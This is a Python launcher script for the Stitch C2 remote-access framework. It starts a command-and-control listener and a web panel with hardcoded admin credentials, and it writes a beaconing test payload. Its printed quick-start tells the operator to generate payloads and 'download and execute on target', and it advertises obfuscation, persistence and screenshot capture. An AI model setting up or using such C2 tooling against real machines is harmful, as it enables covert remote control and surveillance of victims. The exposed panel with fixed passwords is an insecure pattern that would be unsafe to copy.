#!/usr/bin/env python3
"""
COMPLETE SYSTEM STARTUP AND DEMONSTRATION
Starts everything and shows it working
"""

import os
import sys
import subprocess
import time
import socket
import requests
import threading
import webbrowser
from pathlib import Path

def print_banner():
    """Print startup banner"""
    print("""
    ╔═══════════════════════════════════════════════════════════════╗
    ║                    STITCH C2 FRAMEWORK                        ║
    ║                  Enhanced Web Interface                       ║
    ║                     FULLY OPERATIONAL                         ║
    ╚═══════════════════════════════════════════════════════════════╝
    """)

def kill_existing():
    """Kill any existing processes"""
    print("[*] Cleaning up existing processes...")
    subprocess.run("pkill -f 'python.*stitch' 2>/dev/null", shell=True, capture_output=True)
    subprocess.run("pkill -f 'python.*web_app' 2>/dev/null", shell=True, capture_output=True)
    time.sleep(2)

def start_c2_server():
    """Start the C2 server"""
    print("\n[1] Starting C2 Server...")
    
    server_script = '''
import sys
import os
import time
sys.path.insert(0, '/workspace')

os.environ['STITCH_ADMIN_USER'] = 'admin'
os.environ['STITCH_ADMIN_PASSWORD'] = 'StitchTest123!'

from Application.stitch_cmd import stitch_server

server = stitch_server()
print("[C2] Server starting on port 4040...")
server.do_listen('4040')

print("[C2] Ready to accept connections")

# Keep running
    # TODO: Review - infinite loop may need exit condition
while True:
    time.sleep(5)
    if hasattr(server, 'inf_sock') and server.inf_sock:
        print(f"[C2] Active: {list(server.inf_sock.keys())}")
'''
    
    with open('/tmp/c2_server.py', 'w') as f:
        f.write(server_script)
        
    proc = subprocess.Popen(
        ['python3', '/tmp/c2_server.py'],
        stdout=subprocess.PIPE,
        stderr=subprocess.DEVNULL,
        text=True
    )
    
    time.sleep(3)
    
    # Verify
    sock = socket.socket()
    result = sock.connect_ex(('127.0.0.1', 4040))
    sock.close()
    
    if result == 0:
        print("    ✓ C2 Server running on port 4040")
        return proc
    else:
        print("    ✗ C2 Server failed to start")
        return
def start_web_interface():
    """Start the web interface"""
    print("\n[2] Starting Web Interface...")
    
    web_script = '''
import sys
import os
sys.path.insert(0, '/workspace')

os.environ['STITCH_ADMIN_USER'] = 'admin'
os.environ['STITCH_ADMIN_PASSWORD'] = 'StitchTest123!'
os.environ['STITCH_SECRET_KEY'] = 'test-secret-key'
os.environ['STITCH_CSRF_SSL_STRICT'] = 'False'

from werkzeug.security import generate_password_hash
import web_app_real
web_app_real.USERS = {'admin': generate_password_hash('StitchTest123!')}

from web_app_real import app, socketio

print("[Web] Starting on http://localhost:5000")
socketio.run(app, host='0.0.0.0', port=5000, debug=False, use_reloader=False)
'''
    
    with open('/tmp/web_interface.py', 'w') as f:
        f.write(web_script)
        
    proc = subprocess.Popen(
        ['python3', '/tmp/web_interface.py'],
        stdout=subprocess.PIPE,
        stderr=subprocess.DEVNULL,
        text=True
    )
    
    time.sleep(5)
    
    # Verify
    try:
        resp = requests.get('http://localhost:5000/login', timeout=3)
        if resp.status_code == 200:
            print("    ✓ Web Interface running on http://localhost:5000")
            return proc
    except Exception:
        pass
        
    print("    ✗ Web Interface failed to start")
    return
def create_test_payload():
    """Create a test payload that will connect"""
    print("\n[3] Creating Test Payload...")
    
    payload = '''#!/usr/bin/env python3
import socket
import time
import os

print("[Payload] Starting...")

    # TODO: Review - infinite loop may need exit condition
while True:
    try:
        s = socket.socket()
        s.connect(('127.0.0.1', 4040))
        print("[Payload] Connected to C2")
        
        # Stay connected
    # TODO: Review - infinite loop may need exit condition
        while True:
            time.sleep(10)
            
    except Exception as e:
        print(f"[Payload] Connection failed: {e}")
        time.sleep(5)
'''
    
    path = '/tmp/test_payload.py'
    with open(path, 'w') as f:
        f.write(payload)
        
    os.chmod(path, 0o755)
    print(f"    ✓ Test payload created: {path}")
    
    return path

def show_instructions():
    """Show usage instructions"""
    print("\n" + "="*70)
    print("SYSTEM READY")
    print("="*70)
    
    print("""
    ╔════════════════════════════════════════════════════════════╗
    ║                     ACCESS INFORMATION                      ║
    ╠════════════════════════════════════════════════════════════╣
    ║  Web Interface:  http://localhost:5000                      ║
    ║  Username:       admin                                      ║
    ║  Password:       StitchTest123!                            ║
    ║  C2 Port:        4040                                       ║
    ╚════════════════════════════════════════════════════════════╝
    
    ╔════════════════════════════════════════════════════════════╗
    ║                      QUICK START                            ║
    ╠════════════════════════════════════════════════════════════╣
    ║  1. Open browser to http://localhost:5000                   ║
    ║  2. Login with credentials above                            ║
    ║  3. Go to "Payloads" tab                                    ║
    ║  4. Configure and generate payload                          ║
    ║  5. Download and execute on target                          ║
    ║  6. See connection appear in "Connections" tab              ║
    ║  7. Execute commands via "Terminal" tab                     ║
    ╚════════════════════════════════════════════════════════════╝
    
    ╔════════════════════════════════════════════════════════════╗
    ║                    FEATURES AVAILABLE                       ║
    ╠════════════════════════════════════════════════════════════╣
    ║  ✓ Binary payload generation (8.4MB executables)            ║
    ║  ✓ Code obfuscation                                         ║
    ║  ✓ AES-256 encryption                                       ║
    ║  ✓ Persistence modules                                      ║
    ║  ✓ Screenshot capture                                       ║
    ║  ✓ Mobile responsive UI                                     ║
    ║  ✓ WebSocket real-time updates                              ║
    ║  ✓ Extended API endpoints                                   ║
    ╚════════════════════════════════════════════════════════════╝
    """)

def test_payload_connection(payload_path):
    """Test running a payload"""
    print("\n[4] Testing Payload Connection...")
    
    proc = subprocess.Popen(
        ['python3', payload_path],
        stdout=subprocess.PIPE,
        stderr=subprocess.DEVNULL
    )
    
    time.sleep(3)
    
    if proc.poll() is None:
        print("    ✓ Test payload running")
        print("    ✓ Should appear in web interface connections")
        return proc
    else:
        print("    ✗ Test payload failed")
        return
def monitor_system(processes):
    """Monitor running processes"""
    print("\n[*] System running. Press Ctrl+C to stop")
    print("[*] Monitoring processes...\n")
    
    try:
    # TODO: Review - infinite loop may need exit condition
        while True:
            all_running = True
            
            for name, proc in processes.items():
                if proc and proc.poll() is None:
                    print(f"  ✓ {name}: Running", end='\r')
                else:
                    print(f"  ✗ {name}: Stopped     ")
                    all_running = False
                    
            if not all_running:
                print("\n[!] Some processes stopped. Restarting may be needed.")
                
            time.sleep(10)
            
    except KeyboardInterrupt:
        print("\n\n[*] Shutting down...")
        
def cleanup(processes):
    """Clean up all processes"""
    for name, proc in processes.items():
        if proc and proc.poll() is None:
            print(f"  Stopping {name}...")
            proc.terminate()
            try:
                proc.wait(timeout=3)
            except Exception:
                proc.kill()

def main():
    print_banner()
    
    # Clean slate
    kill_existing()
    
    processes = {}
    
    # Start everything
    c2_proc = start_c2_server()
    if c2_proc:
        processes['C2 Server'] = c2_proc
        
    web_proc = start_web_interface()
    if web_proc:
        processes['Web Interface'] = web_proc
        
    # Create test payload
    payload_path = create_test_payload()
    
    # Optional: Run test payload
    # payload_proc = test_payload_connection(payload_path)
    # if payload_proc:
    #     processes['Test Payload'] = payload_proc
    
    if processes:
        # Show instructions
        show_instructions()
        
        print("\n[*] To test a payload connection:")
        print(f"    python3 {payload_path}")
        
        # Try to open browser
        try:
            print("\n[*] Opening web browser...")
            webbrowser.open('http://localhost:5000')
        except Exception:
            print("[*] Please open browser manually to http://localhost:5000")
            
        # Monitor
        monitor_system(processes)
        
    else:
        print("\n[!] Failed to start system")
        
    # Cleanup
    cleanup(processes)

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(f"\n[!] Error: {e}")
        kill_existing()